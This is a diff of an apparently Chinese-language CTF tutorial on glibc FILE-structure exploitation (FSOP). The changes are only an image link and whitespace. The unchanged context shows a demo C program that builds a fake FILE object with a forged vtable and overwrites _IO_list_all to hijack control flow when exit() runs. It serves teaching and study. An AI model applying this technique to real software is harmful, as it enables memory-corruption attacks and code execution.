@@ -24,7 +24,7 @@ _IO_flush_all_lockp (int do_lock)
 }
 ```
 
-![](https://4.bp.blogspot.com/-r3hv51vGsJs/V_4_4jkccpI/AAAAAAAAA2E/y1l9eM7mbhw9AIA6Md5suNpo32cCk6QiwCPcB/s1600/abort_routine.001.jpeg)
+![](/pwn/io_file/figure/abort_routine.001.jpeg)
 
 而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：
 
@@ -73,20 +73,20 @@ int main(void)
 {
     void *ptr;
     long long *list_all_ptr;
-    
+
     ptr=malloc(0x200);
-    
+
     *(long long*)((long long)ptr+mode_offset)=0x0;
     *(long long*)((long long)ptr+writeptr_offset)=0x1;
     *(long long*)((long long)ptr+writebase_offset)=0x0;
     *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);
-    
+
     *(long long*)((long long)ptr+0x100+24)=0x41414141;
-    
+
     list_all_ptr=(long long *)_IO_list_all;
-    
+
     list_all_ptr[0]=ptr;
-    
+
     exit(0);
 }
 ```
@@ -106,6 +106,3 @@ int main(void)
 [#4] 0x4005ce → Name: main()
 
 ```
-
-
-
